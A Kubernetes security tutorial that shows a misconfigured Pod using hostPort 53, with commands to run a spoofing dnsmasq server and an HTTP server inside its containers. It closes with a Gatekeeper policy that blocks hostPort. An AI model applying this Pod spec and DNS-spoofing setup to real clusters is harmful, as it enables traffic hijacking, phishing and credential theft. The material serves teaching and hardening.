### Attack Example: HostPort Exploitation with Multiple Containers

In this scenario, we will explore how an attacker can exploit a Pod configured with multiple containers, where one container uses a `hostPort` to gain control over a critical port on the host system. This example demonstrates the risks associated with exposing host ports to containers and using multiple containers within a single Pod.

#### Pod YAML Definition

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: badpod04
spec:
  containers:
  - name: container01
    image: busybox
    command: ["sh", "-c", "sleep 3600"]
    ports:
    - name: admin
      containerPort: 8000
      protocol: TCP
  - name: container02
    image: busybox
    command: ["sh", "-c", "sleep 3600"]
    ports:
    - name: dns
      containerPort: 5553
      hostPort: 53
      protocol: UDP
```

#### Attack Scenario

1. **Pod Creation**

   The attacker creates the Pod `badpod04` with two containers. The second container (`container02`) binds its port `5553` to the host's port `53` for UDP traffic, commonly used for DNS services, while the first container (`container01`) exposes a TCP port `8000` for administrative access.

2. **Gaining Control Over DNS Port**

   By binding to port `53` on the host, the attacker can control DNS traffic to and from the host. This allows the attacker to intercept, modify, or block DNS queries.

3. **Running a Malicious DNS Service**

   Once the Pod is running, the attacker can set up a malicious DNS server inside the second container to respond to DNS queries with false information:

   ```sh
   kubectl exec -it badpod04 -c container02 -- sh
   # Install dnsmasq and configure it
   apk update && apk add dnsmasq
   echo "address=/malicious.com/192.168.1.100" > /etc/dnsmasq.conf
   dnsmasq -k
   ```

   This configuration makes any DNS query for `malicious.com` resolve to `192.168.1.100`, a malicious IP address.

4. **Exploiting the Admin Port**

   The attacker can also use the exposed TCP port `8000` in the first container for administrative access to run additional services or control scripts. This port could be used to serve an administrative interface or run an HTTP server.

   ```sh
   # Start a simple HTTP server
   kubectl exec -it badpod04 -c container01 -- sh
   apk update && apk add python3
   python3 -m http.server 8000
   ```

5. **Intercepting and Manipulating DNS Traffic**

   With control over the DNS port, the attacker can perform various malicious activities:

   - **Phishing Attacks**: Redirect legitimate domains to malicious servers designed to steal credentials or distribute malware.
   - **Man-in-the-Middle (MitM) Attacks**: Redirect traffic to an attacker-controlled server to intercept and manipulate communications.
   - **Denial of Service**: Block legitimate DNS queries, causing disruptions in network services.

6. **Accessing the Admin Interface**

   The attacker can access the administrative interface on port `8000` to manage or further exploit the container and host.

#### Impact of the Attack

- **Traffic Redirection**: The attacker can redirect traffic intended for legitimate sites to malicious servers, facilitating phishing and other malicious activities.
- **Service Disruption**: By manipulating or blocking DNS traffic, the attacker can cause significant disruptions to network services.
- **Information Theft**: Intercepting and manipulating DNS traffic can lead to the theft of sensitive information, such as credentials and personal data.
- **Administrative Access**: The exposed admin port provides the attacker with additional control and management capabilities, increasing the attack surface.

### Mitigation

To mitigate these risks, ensure that Pods do not use `hostPort` unless absolutely necessary and implement policies to enforce this.

#### Gatekeeper Policy Example

```yaml
apiVersion: constraints.gatekeeper.sh/v1beta1
kind: K8sNoHostPort
metadata:
  name: disallow-hostport
spec:
  match:
    kinds:
      - apiGroups: [""]
        kinds: ["Pod"]
  validation:
    message: "Using hostPort is disallowed."
    deny:
      conditions:
        all:
          - key: "spec.containers[*].ports[*].hostPort"
            operator: Exists
```

### Expected Error Message

If the policy disallows `hostPort`, attempting to create `badpod04` will result in an error:

```
Error from server (Forbidden): error when creating "badpod04.yaml": admission webhook "validation.gatekeeper.sh" denied the request: Using hostPort is disallowed.
```

### Summary

Disallowing the use of `hostPort` in Kubernetes pods prevents containers from gaining control over host ports, thereby enhancing the security and integrity of the host's network services. Use policies to enforce these restrictions and ensure a secure cluster environment.